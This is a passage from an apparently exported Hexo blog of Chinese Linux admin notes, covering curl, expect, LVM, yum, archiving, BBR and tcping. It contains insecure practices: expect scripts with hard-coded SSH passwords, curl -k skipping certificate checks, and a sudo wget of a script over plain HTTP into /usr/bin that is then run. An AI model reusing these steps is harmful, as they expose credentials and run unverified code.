03:29:04.000Z","comments":true,"path":"2021/08/08/curl/","permalink":"http://example.com/2021/08/08/curl/","excerpt":"","text":"基本参数1234567891011121314不带有任何参数时，curl 就是发出 GET 请求。curl https://www.example.com-O参数将服务器回应保存成文件，并将 URL 的最后部分当作文件名。curl -O https://www.example.com/foo/bar.html-s参数将不输出错误和进度信息。curl -s https://www.example.com-S参数指定只输出错误信息，通常与-s一起使用。curl -s -o /dev/null https://google.com-L参数会让 HTTP 请求跟随服务器的重定向。curl 默认不跟随重定向。curl -L -d &#x27;tweet=hi&#x27; https://api.twitter.com/tweet 指定网卡1curl --interface ppp3 cip.cc 参考：https://www.ruanyifeng.com/blog/2019/09/curl-reference.html CURL命令忽略https请求的SSL证书12curl -k https://osetc.comcurl --insecure https://www.osetc.com 使用curl命令获取文件下载速度12curl -Lo /dev/null -skw &quot;%&#123;speed_download&#125;\\n&quot; http://mirrors.163.com/ubuntu/ls-lR.gz226493.000 当然，还可以获取连接时间、重定向时间等更多的数据： 12345678curl -Lo /dev/null -skw &quot;time_connect: %&#123;time_connect&#125; s\\ntime_namelookup: %&#123;time_namelookup&#125; s\\ntime_pretransfer: %&#123;time_pretransfer&#125; s\\ntime_starttransfer: %&#123;time_starttransfer&#125; s\\ntime_redirect: %&#123;time_redirect&#125; s\\nspeed_download: %&#123;speed_download&#125; B/s\\ntime_total: %&#123;time_total&#125; s\\n\\n&quot; http://www.sina.comtime_connect: 0.154 stime_namelookup: 0.150 stime_pretransfer: 0.154 stime_starttransfer: 0.163 stime_redirect: 0.157 sspeed_download: 324679.000 B/stime_total: 1.692 s 计算机网络中常用的速率换算关系(B&#x2F;s vs b&#x2F;s)1234在计算机网络、IDC机房中，其宽带速率的单位用bps(或b/s)表示；换算关系为：1Byte=8bit1B=8b ---------- 1B/s=8b/s(或1Bps=8bps)1KB=1024B ---------- 1KB/s=1024B/s1MB=1024KB ---------- 1MB/s=1024KB/s 计算机网络中常用的速率换算关系(B&#x2F;s vs b&#x2F;s)","categories":[{"name":"linux网络","slug":"linux网络","permalink":"http://example.com/categories/linux%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"curl","slug":"curl","permalink":"http://example.com/tags/curl/"}]},{"title":"expect 介绍和用法","slug":"expect介绍和用法","date":"2021-08-07T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/08/08/expect介绍和用法/","permalink":"http://example.com/2021/08/08/expect%E4%BB%8B%E7%BB%8D%E5%92%8C%E7%94%A8%E6%B3%95/","excerpt":"","text":"介绍：expect是一个自动化交互套件，主要应用于执行命令和程序时，系统以交互形式要求输入指定字符串，实现交互通信。 expect自动交互流程： spawn启动指定进程—expect获取指定关键字—send向指定程序发送指定字符—执行完成退出. 安装：1yum install expect -y expect常用命令总结:12345678910spawn 交互程序开始后面跟命令或者指定程序expect 获取匹配信息匹配成功则执行expect后面的程序动作send exp_send 用于发送指定的字符串信息exp_continue 在expect中多次匹配就需要用到send_user 用来打印输出 相当于shell中的echoexit 退出expect脚本eof expect执行结束 退出set 定义变量puts 输出变量set timeout 设置超时时间 例子1123456789#! /usr/bin/expectset timeout 3 spawn ssh root@X.X.X.X -p 12345expect &quot;*password*&quot; #期待匹配到 &#x27;user_name@ip_string&#x27;s password:&#x27;send &quot;passwd\\r&quot;interact 在脚本中使用：1234567891011121314151617/usr/bin/expect &lt;&lt; EOFspawn /usr/bin/ssh -t -p 22022 admin@$i &quot;sudo su -&quot;expect &#123; &quot;yes/no&quot; &#123; send &quot;yes\\r&quot; &#125;&#125; expect &#123; &quot;password:&quot; &#123; send &quot;xxo1#qaz\\r&quot; &#125;&#125;expect &#123; &quot;*password*:&quot; &#123; send &quot;xx1#qaz\\r&quot; &#125;&#125;expect eofEOF 参考：https://www.cnblogs.com/saneri/p/10819348.html","categories":[{"name":"shell","slug":"shell","permalink":"http://example.com/categories/shell/"}],"tags":[{"name":"自动化交互","slug":"自动化交互","permalink":"http://example.com/tags/%E8%87%AA%E5%8A%A8%E5%8C%96%E4%BA%A4%E4%BA%92/"}]},{"title":"lvm分区","slug":"lvm介绍","date":"2021-08-07T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/08/08/lvm介绍/","permalink":"http://example.com/2021/08/08/lvm%E4%BB%8B%E7%BB%8D/","excerpt":"","text":"PE：就是最基础的单元，通过pvcreate /dev/sdb创建pv（也就是把sdb格式化，一个PE的大小为4M） PV：物理卷 VG：卷组（存储池子） LV：逻辑卷（也就是sdb1,sdb2，最终的分区） lvm分区步骤：1234567891011使用parted将硬盘转换为gpt模式parted /dev/sdbmklabel gptpvcreate /dev/sdbvgcreate group_sdb /dev/sdblvcreate disk_sdb1mkfs.xfs -f /dev/group_sdb/disk_sdb1 lvm分区删除步骤：12345678910111213141516171819执行umount 卸载挂载在LV上的目录查看LVlvscan删除LVlvremove /dev/group_sdb/disk_sdb1查看VGvgscan删除VGvgremove group_sdb查看PVpvscan删除PVpvremove /dev/sdb 命令介绍：123456789101112131415在名为vg_newlvm的卷组中创建15G大小的逻辑卷：lvcreate -L 15G vg_newlvm在名为vgnewlvm的卷组中创建大小为2500MB的逻辑卷，并命名为centos7newvol，这样就创建了块设备/dev/vgnewlvm/centos7newvol：lvcreate -L 2500 -n centos7_newvol vg_newlvm可以使用lvcreate命令的参数-l来指定逻辑卷扩展的大小。也可以使用这个参数以卷组的大小百分比来扩展逻辑卷。这下列的命令创建了centos7newvol卷组的50%大小的逻辑卷vgnewlvm:lvcreate -l 50%VG -n centos7_newvol vg_newlvm使用卷组剩下的所有空间创建逻辑卷lvcreate --name centos7newvol -l 100%FREE vgnewlvmpvdisplaylvdisplayvgdisplay 命令存放目录：&#x2F;usr&#x2F;sbin&#x2F; 参考：https://linux.cn/article-5117-1.html参考：https://blog.csdn.net/BIGmustang/article/details/107062295#_pv_vg__lv___71","categories":[{"name":"linux文件系统","slug":"linux文件系统","permalink":"http://example.com/categories/linux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"lvm","slug":"lvm","permalink":"http://example.com/tags/lvm/"}]},{"title":"rsync用法","slug":"rsync","date":"2021-08-07T16:00:00.000Z","updated":"2021-10-18T07:17:40.000Z","comments":true,"path":"2021/08/08/rsync/","permalink":"http://example.com/2021/08/08/rsync/","excerpt":"","text":"参考链接","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"rsync","slug":"rsync","permalink":"http://example.com/tags/rsync/"}]},{"title":"sort排序","slug":"sort排序","date":"2021-08-07T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/08/08/sort排序/","permalink":"http://example.com/2021/08/08/sort%E6%8E%92%E5%BA%8F/","excerpt":"","text":"参考：https://blog.csdn.net/monkeyduck/article/details/10097829","categories":[{"name":"shell","slug":"shell","permalink":"http://example.com/categories/shell/"}],"tags":[{"name":"sort","slug":"sort","permalink":"http://example.com/tags/sort/"}]},{"title":"只读文件系统 /var/cache/yum/x86 64/7/base/repomd.xml.old.tmp","slug":"只读文件系统","date":"2021-08-07T16:00:00.000Z","updated":"2021-08-23T05:09:38.000Z","comments":true,"path":"2021/08/08/只读文件系统/","permalink":"http://example.com/2021/08/08/%E5%8F%AA%E8%AF%BB%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/","excerpt":"","text":"问题： 1234567891011Errno 30] 只读文件系统: &#x27;/var/cache/yum/x86_64/7/base/repomd.xml.old.tmp&#x27;分析：不知道到底是什么，但一定yum源有了问题；网上搜了一大堆，大多是yum clean清缓存的，没试，应该也行；解决：进入/var/cache/yum/, 执行rm -rf x86_64/c, 删除缓存；报错：rm: 无法删除&quot;xxx&quot;: 只读文件系统执行mount -o remount,rw /, 再次删除；执行yum repolist; ok, 搞定 参考：https://blog.csdn.net/xue15029240296/article/details/103211911","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"技巧","slug":"技巧","permalink":"http://example.com/tags/%E6%8A%80%E5%B7%A7/"}]},{"title":"shell后台运行脚本","slug":"shell后台运行脚本","date":"2021-07-27T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/07/28/shell后台运行脚本/","permalink":"http://example.com/2021/07/28/shell%E5%90%8E%E5%8F%B0%E8%BF%90%E8%A1%8C%E8%84%9A%E6%9C%AC/","excerpt":"","text":"参考链接：https://www.huaweicloud.com/articles/84e5df15472f1f9d3011e2fdda7ed825.html","categories":[{"name":"shell","slug":"shell","permalink":"http://example.com/categories/shell/"}],"tags":[{"name":"shell后台运行脚本","slug":"shell后台运行脚本","permalink":"http://example.com/tags/shell%E5%90%8E%E5%8F%B0%E8%BF%90%E8%A1%8C%E8%84%9A%E6%9C%AC/"}]},{"title":"shell时间戳","slug":"shell时间戳","date":"2021-07-27T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/07/28/shell时间戳/","permalink":"http://example.com/2021/07/28/shell%E6%97%B6%E9%97%B4%E6%88%B3/","excerpt":"","text":"123456789用shell将时间字符串与时间戳互转：date -d &quot;2010-10-18 00:00:00&quot; +%s 输出形如：1287331200而时间戳转换为字符串可以这样做：date -d @1287331200 &quot;+%Y-%m-%d&quot; 输出形如：2010-10-18时间戳可以理解为秒数，是可以加减的","categories":[{"name":"shell","slug":"shell","permalink":"http://example.com/categories/shell/"}],"tags":[{"name":"shell时间戳","slug":"shell时间戳","permalink":"http://example.com/tags/shell%E6%97%B6%E9%97%B4%E6%88%B3/"}]},{"title":"shell运算","slug":"shell运算","date":"2021-07-27T16:00:00.000Z","updated":"2021-11-19T02:45:44.000Z","comments":true,"path":"2021/07/28/shell运算/","permalink":"http://example.com/2021/07/28/shell%E8%BF%90%E7%AE%97/","excerpt":"","text":"let命令1234567let &quot;sum=3+5&quot; # sum &lt;- 8let &quot;sum=3*5&quot; # sum &lt;- 15 let &quot;sum=2/5&quot; # sum &lt;- 0 let &quot;sum=11/5&quot; # sum &lt;- 2 let &quot;sum=11%5&quot; # sum &lt;- 1 let &quot;sum=-6-9&quot; # sum &lt;- -15let &quot;sum=(-6-9)*5&quot; # sum &lt;- -75 参考链接：https://blog.csdn.net/shimazhuge/article/details/38703523 浮点数运算 bc bc是bash内建的运算容器，支持浮点数运算 内建变量scale(精确度，可以理解为小数位数)可以设置，默认为0 bc有的linux内置，有的没有内置 （我使用centos 7.x server 是没有的 可以直接yum install bc -y） bc操作符对照表12345678操作符 含义-----------------------num1 + num2 加num1 - num2 减num1 * num2 乘num1 / num2 除num1 % num2 取余num1 ^ num2 指数运算 演示123456789101112echo &quot;23 / 12&quot; | bc# 1echo &quot;23.2 + 12&quot; | bc# 35.2echo &quot;scale=2; 23.3 / 12&quot; | bc# 1.94echo &quot;10 / 3 * 2&quot; | bc# 6echo &quot;scale=4; 10 / 3 * 2&quot; | bc# 6.6666# 加减法小数运算可以不指定scale，但是乘除如果有小数一定要加scale","categories":[{"name":"shell","slug":"shell","permalink":"http://example.com/categories/shell/"}],"tags":[{"name":"shell运算","slug":"shell运算","permalink":"http://example.com/tags/shell%E8%BF%90%E7%AE%97/"}]},{"title":"下载离线网页","slug":"下载离线网页","date":"2021-07-27T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/07/28/下载离线网页/","permalink":"http://example.com/2021/07/28/%E4%B8%8B%E8%BD%BD%E7%A6%BB%E7%BA%BF%E7%BD%91%E9%A1%B5/","excerpt":"","text":"1234567wget -r -p -np -k http://xxx.com/xxx-r, --recursive（递归） specify recursive download.（指定递归下载）-k, --convert-links（转换链接） make links in downloaded HTML point to local files.（将下载的HTML页面中的链接转换为相对链接即本地链接）-p, --page-requisites（页面必需元素） get all images, etc. needed to display HTML page.（下载所有的图片等页面显示所需的内容）-np, --no-parent（不追溯至父级） don&#x27;t ascend to the parent directory.另外断点续传用-nc参数 日志 用-o参数","categories":[{"name":"linux网络","slug":"linux网络","permalink":"http://example.com/categories/linux%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"wget","slug":"wget","permalink":"http://example.com/tags/wget/"}]},{"title":"lrzsz乱码问题","slug":"lrzsz乱码","date":"2021-07-20T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/07/21/lrzsz乱码/","permalink":"http://example.com/2021/07/21/lrzsz%E4%B9%B1%E7%A0%81/","excerpt":"","text":"1234rz -be-b –binary 用binary的方式上传下载-e –escape 强制escape 所有控制字符","categories":[{"name":"文件传输","slug":"文件传输","permalink":"http://example.com/categories/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/"}],"tags":[{"name":"lrzsz","slug":"lrzsz","permalink":"http://example.com/tags/lrzsz/"}]},{"title":"linux解压命令大全","slug":"linux解压命令大全","date":"2021-07-15T16:00:00.000Z","updated":"2022-06-10T09:57:12.000Z","comments":true,"path":"2021/07/16/linux解压命令大全/","permalink":"http://example.com/2021/07/16/linux%E8%A7%A3%E5%8E%8B%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/","excerpt":"","text":"转载：https://www.cnblogs.com/eoiioe/archive/2008/09/20/1294681.html .tar 123解包：tar xvf FileName.tar打包：tar cvf FileName.tar DirName（注：tar是打包，不是压缩！） .gz 123解压1：gunzip FileName.gz解压2：gzip -d FileName.gz压缩：gzip FileName .tar.gz 和 .tgz 12解压：tar zxvf FileName.tar.gz压缩：tar zcvf FileName.tar.gz DirName .bz2 123解压1：bzip2 -d FileName.bz2解压2：bunzip2 FileName.bz2压缩： bzip2 -z FileName .tar.bz2 12解压：tar jxvf FileName.tar.bz2压缩：tar jcvf FileName.tar.bz2 DirName .bz 123解压1：bzip2 -d FileName.bz解压2：bunzip2 FileName.bz压缩：未知 .tar.bz 12解压：tar jxvf FileName.tar.bz压缩：未知 .Z 12解压：uncompress FileName.Z压缩：compress FileName .tar.Z 12解压：tar Zxvf FileName.tar.Z压缩：tar Zcvf FileName.tar.Z DirName .zip 123456789101112unzip解压乱码原因：由于zip格式中并没有指定编码格式，Windows下生成的zip文件中的编码是GBK/GB2312等，因此，导致这些zip文件在Linux下解压时出现乱码问题，因为Linux下的默认编码是UTF8解决方法unzip -O cp936 mk.zip -d /root/&quot;---------------------------------&quot;解压：unzip FileName.zip压缩：zip FileName.zip DirName .rar 12解压：rar x FileName.rar压缩：rar a FileName.rar DirName .lha 12解压：lha -e FileName.lha压缩：lha -a FileName.lha FileName .rpm 1解包：rpm2cpio FileName.rpm | cpio -div .deb 1解包：ar p FileName.deb data.tar.gz | tar zxf - .tar .tgz .tar.gz .tar.Z .tar.bz .tar.bz2 .zip .cpio .rpm .deb .slp .arj .rar .ace .lha .lzh .lzx .lzs .arc .sda .sfx .lnx .zoo .cab .kar .cpt .pit .sit .sea 1234解压：sEx x FileName.*压缩：sEx a FileName.* FileNamesEx只是调用相关程序，本身并无压缩、解压功能，请注意！ gzip 命令 12减少文件大小有两个明显的好处，一是可以减少存储空间，二是通过网络传输文件时，可以减少传输的时间。gzip 是在 Linux 系统中经常使用的一个对文件进行压缩和解压缩的命令，既方便又好用。 语法：gzip [选项] 压缩（解压缩）的文件名该命令的各选项含义如下： 123456789-c 将输出写到标准输出上，并保留原有文件。-d 将压缩文件解压。-l 对每个压缩文件，显示下列字段；压缩文件的大小；未压缩文件的大小；压缩比；未压缩文件的名字-r 递归式地查找指定目录并压缩其中的所有文件或者是解压缩。-t 测试，检查压缩文件是否完整。-v 对每一个压缩和解压的文件，显示文件名和压缩比。-num 用指定的数字 num 调整压缩的速度，-1 或 --fast 表示最快压缩方法（低压缩比），-9 或--best表示最慢压缩方法（高压缩比）。系统缺省值为6。指令实例： gzip *% 把当前目录下的每个文件压缩成 .gz 文件。gzip -dv *% 把当前目录下每个压缩的文件解压，并列出详细的信息。gzip -l *% 详细显示例1中每个压缩的文件的信息，并不解压。gzip usr.tar% 压缩 tar 备份文件 usr.tar，此时压缩文件的扩展名为.tar.gz。 .7z 1234567891011121314安装：yum -y install epel-releaseyum -y install p7zip p7zip-plugins压缩：7z a [目标文件名].7z [原文件名/目录名]解压：7z x [原文件名].7z指定当前目录文件夹demo下7za x chrysanthemum_test_images.7z -r -o./demo将filename.7z解压到当前目录：7z x filename.7z -r -o./将当前目录下的所有文件压缩成test.7z文件：7z a -t7z -r test.7z ./*","categories":[{"name":"linux解压","slug":"linux解压","permalink":"http://example.com/categories/linux%E8%A7%A3%E5%8E%8B/"}],"tags":[{"name":"技巧","slug":"技巧","permalink":"http://example.com/tags/%E6%8A%80%E5%B7%A7/"}]},{"title":"centos 7 开启bbr网络加速","slug":"centos开启bbr","date":"2021-07-14T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/07/15/centos开启bbr/","permalink":"http://example.com/2021/07/15/centos%E5%BC%80%E5%90%AFbbr/","excerpt":"","text":"转载：https://www.gaoxiaobo.com/web/server/131.html 1、查看当前内核 1uname -r 2、导入ELRepo公钥 1rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org 3、安装ELRepo 1yum install https://www.elrepo.org/elrepo-release-7.el7.elrepo.noarch.rpm -y 4、查看ELRepo提供的内核版本 1yum --disablerepo=&quot;*&quot; --enablerepo=&quot;elrepo-kernel&quot; list available 5、安装kernel-ml内核，此步安装时间可能比较长，耐心等待并非卡住了 123#kernel-lt：表示longterm，即长期支持的内核；当前为4.4.*。#kernel-ml：表示mainline，即当前主线的内核；当前为5.2.*yum --disablerepo=&#x27;*&#x27; --enablerepo=elrepo-kernel install kernel-ml -y 6、设置默认启动为新内核 1grub2-set-default 0 7、启用BBR 12echo &#x27;net.core.default_qdisc=fq&#x27; &gt;&gt; /etc/sysctl.confecho &#x27;net.ipv4.tcp_congestion_control=bbr&#x27; &gt;&gt; /etc/sysctl.conf 8、重启系统 1reboot 9、检查BBR是否成功 12345678910111213141516验证当前TCP控制算法的命令：sysctl -n net.ipv4.tcp_congestion_control返回值一般为net.ipv4.tcp_available_congestion_control = bbr cubic reno或者为net.ipv4.tcp_available_congestion_control = reno cubic bbr验证BBR是否已经启动sysctl net.ipv4.tcp_congestion_control返回值一般为net.ipv4.tcp_congestion_control = bbrlsmod | grep bbr返回值有 tcp_bbr 模块即说明 bbr 已启动。注意：并不是所有的 VPS 都会有此返回值，若没有也属正常。 停掉bbr1234sed -i &#x27;/net.core.default_qdisc/d&#x27; /etc/sysctl.conf sed -i &#x27;/net.ipv4.tcp_congestion_control/d&#x27; /etc/sysctl.conf sysctl -preboot","categories":[{"name":"bbr网络加速","slug":"bbr网络加速","permalink":"http://example.com/categories/bbr%E7%BD%91%E7%BB%9C%E5%8A%A0%E9%80%9F/"}],"tags":[{"name":"技巧","slug":"技巧","permalink":"http://example.com/tags/%E6%8A%80%E5%B7%A7/"}]},{"title":"pip问题","slug":"pip安装python3.6","date":"2021-07-08T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/07/09/pip安装python3.6/","permalink":"http://example.com/2021/07/09/pip%E5%AE%89%E8%A3%85python3.6/","excerpt":"","text":"安装python3.6pip3 install wheel –target&#x3D;&#x2F;usr&#x2F;lib&#x2F;python3.6&#x2F;site-packagespip3 install pyshark –target&#x3D;&#x2F;usr&#x2F;lib&#x2F;python3.6&#x2F;site-packages 导入pyshark报错1234567891011Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt; File &quot;/usr/lib/python3.6/site-packages/pyshark/__init__.py&quot;, line 13, in &lt;module&gt; from pyshark.capture.live_capture import LiveCapture File &quot;/usr/lib/python3.6/site-packages/pyshark/capture/live_capture.py&quot;, line 6, in &lt;module&gt; from pyshark.capture.capture import Capture File &quot;/usr/lib/python3.6/site-packages/pyshark/capture/capture.py&quot;, line 13, in &lt;module&gt; from pyshark.tshark.tshark_xml import packet_from_xml_packet, psml_structure_from_xml File &quot;/usr/lib/python3.6/site-packages/pyshark/tshark/tshark_xml.py&quot;, line 2, in &lt;module&gt; import lxml.objectifyModuleNotFoundError: No module named &#x27;lxml&#x27; pip3 install lxml –target&#x3D;&#x2F;usr&#x2F;lib&#x2F;python3.6&#x2F;site-packages","categories":[{"name":"python","slug":"python","permalink":"http://example.com/categories/python/"}],"tags":[{"name":"pip","slug":"pip","permalink":"http://example.com/tags/pip/"}]},{"title":"软件包管理器yum","slug":"yum","date":"2021-07-08T16:00:00.000Z","updated":"2022-04-07T05:45:26.000Z","comments":true,"path":"2021/07/09/yum/","permalink":"http://example.com/2021/07/09/yum/","excerpt":"","text":"yum的搜索功能yum whatprovides tshark 异常一CentOS7 yum安装软件提示:another app is currently holding the yum lock;waiting for it to exit yum在锁定状态中。可以通过强制关掉yum进程： 1rm -f /var/run/yum.pid 异常二错误：无法从 &#x2F;var&#x2F;lib&#x2F;rpm 打开软件包数据库 123cd /var/lib/rpmrm -rf __db.*rpm --rebuilddb 无法从&#x2F;var&#x2F;lib&#x2F;rpm打开软件包数据库 异常三Cannot find a valid baseurl for repo: base&#x2F;7&#x2F;x86_64 重新编写&#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo文件 进一台正常的机器，把&#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo文件内容复制过来就行 yum源配置文件&#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo，内容如下: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455cat /etc/yum.repos.d/CentOS-Base.repo # CentOS-Base.repo## The mirror system uses the connecting IP address of the client and the# update status of each mirror to pick mirrors that are updated to and# geographically close to the client. You should use this for CentOS updates# unless you are manually picking other mirrors.## If the mirrorlist= does not work for you, as a fall back you can try the # remarked out baseurl= line instead.## [base]name=CentOS-$releasever - Base - mirrors.aliyun.comfailovermethod=prioritybaseurl=http://mirrors.aliyun.com/centos/$releasever/os/$basearch/gpgcheck=1gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7 #released updates [updates]name=CentOS-$releasever - Updates - mirrors.aliyun.comfailovermethod=prioritybaseurl=http://mirrors.aliyun.com/centos/$releasever/updates/$basearch/gpgcheck=1gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7 #additional packages that may be useful[extras]name=CentOS-$releasever - Extras - mirrors.aliyun.comfailovermethod=prioritybaseurl=http://mirrors.aliyun.com/centos/$releasever/extras/$basearch/gpgcheck=1gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7 #additional packages that extend functionality of existing packages[centosplus]name=CentOS-$releasever - Plus - mirrors.aliyun.comfailovermethod=prioritybaseurl=http://mirrors.aliyun.com/centos/$releasever/centosplus/$basearch/gpgcheck=1enabled=0gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7 #contrib - packages by Centos Users[contrib]name=CentOS-$releasever - Contrib - mirrors.aliyun.comfailovermethod=prioritybaseurl=http://mirrors.aliyun.com/centos/$releasever/contrib/$basearch/gpgcheck=1enabled=0gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7 123456789清除缓存yum clean allrm -rf /var/cache/yum/生成缓存yum makecache 用yum安装本地rpm包无法使用网络的环境下，可以使用yum安装本地rpm包 1yum localinstall XXX.rpm 这样可能会出现依赖错误，那么根据报错提示安装相应的包即可","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"yum","slug":"yum","permalink":"http://example.com/tags/yum/"},{"name":"软件包管理器","slug":"软件包管理器","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8/"}]},{"title":"tcp_ip详解","slug":"tcp_ip","date":"2021-07-01T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/07/02/tcp_ip/","permalink":"http://example.com/2021/07/02/tcp_ip/","excerpt":"","text":"ACK (Acknowledge character）: 确认字符 RTT（Round-trip delay time）: 发送一个数据包到收到对应的ACK，所花费的时间 RTO: 发送数据包失败了，要在100ms内重新发送，RTO的值就是100ms","categories":[{"name":"linux网络","slug":"linux网络","permalink":"http://example.com/categories/linux%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"tcp_ip","slug":"tcp-ip","permalink":"http://example.com/tags/tcp-ip/"},{"name":"网络抓包","slug":"网络抓包","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85/"}]},{"title":"tcp重传","slug":"tcp重传","date":"2021-07-01T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/07/02/tcp重传/","permalink":"http://example.com/2021/07/02/tcp%E9%87%8D%E4%BC%A0/","excerpt":"","text":"RtoAlgorithm ：RtoMin :RtoMax :MaxConn :ActiveOpens : 服务器主动连接的TCP请求数PassiveOpens ：服务器接收到的TCP请求数AttemptFailsEstabResets ：TCP连接失败个数(AttemptFails)包含：主动连接失败收到syn包回包syn+ack给对方后，被对方reset收到的请求中，同时有syn+rst flagCurrEstab ：TCP当前建立连接的个数InSegs ：TCP接收的分片数OutSegs ：TCP发送的分片数RetransSegs ：重传分片数InErrs ：TCP入包错误(pkg&#x2F;m,通常是校验错误)OutRsts ：TCP重传率 &#x3D;重传分片数 &#x2F; TCP发送的分片数","categories":[{"name":"linux网络","slug":"linux网络","permalink":"http://example.com/categories/linux%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"网络抓包","slug":"网络抓包","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85/"},{"name":"tcp重传","slug":"tcp重传","permalink":"http://example.com/tags/tcp%E9%87%8D%E4%BC%A0/"}]},{"title":"linux命令路径","slug":"查看linux命令的路径","date":"2021-07-01T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/07/02/查看linux命令的路径/","permalink":"http://example.com/2021/07/02/%E6%9F%A5%E7%9C%8Blinux%E5%91%BD%E4%BB%A4%E7%9A%84%E8%B7%AF%E5%BE%84/","excerpt":"","text":"linux下有2个命令可完成该功能：which ,whereis which 用来查看当，前要执行的命令所在的路径。 1which命令的原理：在PATH变量指定的路径中，搜索某个系统命令的位置，并且返回第一个搜索结果。也就是说，使用which命令，就可以看到某个系统命令是否存在，以及执行的到底是哪一个位置的命令。 whereis 用来查看一个命令或者文件所在的路径。 1whereis命令原理：只能用于程序名的搜索，而且只搜索二进制文件（参数-b）、man说明文件（参数-m）和源代码文件（参数-s）。如果省略参数，则返回所有信息。","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"路径","slug":"路径","permalink":"http://example.com/tags/%E8%B7%AF%E5%BE%84/"}]},{"title":"ubuntu修改时区","slug":"ubuntu修改时区","date":"2021-06-27T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/06/28/ubuntu修改时区/","permalink":"http://example.com/2021/06/28/ubuntu%E4%BF%AE%E6%94%B9%E6%97%B6%E5%8C%BA/","excerpt":"","text":"查找当前时区： 12# cat /etc/timezoneUTC 查看时钟与互联网是否同步 1timedatectl 重启时钟服务 1systemctl restart systemd-timesyncd.service 更改时区列出可用的时区1234timedatectl list-timezones设置时区sudo timedatectl set-timezone Asia/Shanghai","categories":[{"name":"ubuntu","slug":"ubuntu","permalink":"http://example.com/categories/ubuntu/"}],"tags":[{"name":"时间","slug":"时间","permalink":"http://example.com/tags/%E6%97%B6%E9%97%B4/"},{"name":"时区","slug":"时区","permalink":"http://example.com/tags/%E6%97%B6%E5%8C%BA/"}]},{"title":"ubuntu版本","slug":"查看ubuntu版本","date":"2021-06-27T16:00:00.000Z","updated":"2021-10-27T09:36:14.000Z","comments":true,"path":"2021/06/28/查看ubuntu版本/","permalink":"http://example.com/2021/06/28/%E6%9F%A5%E7%9C%8Bubuntu%E7%89%88%E6%9C%AC/","excerpt":"","text":"12345678910111213# lsb_release -aNo LSB modules are available.Distributor ID: UbuntuDescription: Ubuntu 20.04.2 LTSRelease: 20.04Codename: focal或者# cat /etc/issueUbuntu 20.04.2 LTS \\n \\l 查看内存信息1dmidecode|grep -P -A5 &quot;Memory\\s+Device&quot;|grep Size|grep -v Range","categories":[{"name":"ubuntu","slug":"ubuntu","permalink":"http://example.com/categories/ubuntu/"}],"tags":[{"name":"版本","slug":"版本","permalink":"http://example.com/tags/%E7%89%88%E6%9C%AC/"}]},{"title":"tcping  pingIP的端口","slug":"tcping","date":"2021-06-24T16:00:00.000Z","updated":"2021-10-14T10:13:28.000Z","comments":true,"path":"2021/06/25/tcping/","permalink":"http://example.com/2021/06/25/tcping/","excerpt":"","text":"windows版123456软件地址：https://elifulkerson.com/projects/tcping.php用法:tcping.exe $ip $port linux版123456789101112$ sudo yum install tcptraceroute$ cd /usr/bin$ sudo wget http://www.vdberg.org/~richard/tcpping$ sudo chmod 755 tcpping$ tcpping 192.168.3.254 5447traceroute to 192.168.3.254 (192.168.3.254), 255 hops max, 60 byte packetsseq 0: tcp response from 192.168.3.254 (192.168.3.254) &lt;syn,ack&gt; 0.278 mstraceroute to 192.168.3.254 (192.168.3.254), 255 hops max, 60 byte packetsseq 1: tcp response from 192.168.3.254 (192.168.3.254) &lt;syn,ack&gt; 0.773 